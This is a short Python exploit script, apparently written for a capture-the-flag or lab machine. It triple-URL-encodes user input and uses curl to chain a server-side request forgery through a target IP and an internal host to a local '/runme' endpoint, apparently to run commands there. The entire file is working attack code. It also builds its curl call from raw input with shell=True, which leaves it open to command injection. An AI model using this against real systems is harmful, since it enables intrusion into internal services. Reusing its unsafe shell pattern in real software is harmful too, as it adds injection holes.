import urllib.parse
import subprocess

def triple_url_encode(input_str):
    encoded_str = urllib.parse.quote(input_str)
    encoded_str = urllib.parse.quote(encoded_str)
    encoded_str = urllib.parse.quote(encoded_str)
    return encoded_str

def main():
    user_input = input("Enter the input: ")
    encoded_input = triple_url_encode(user_input)

    curl_command = f'curl -i -s "http://10.129.201.238/load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x={encoded_input}"'
    
    subprocess.run(curl_command, shell=True)

if __name__ == "__main__":
    main()
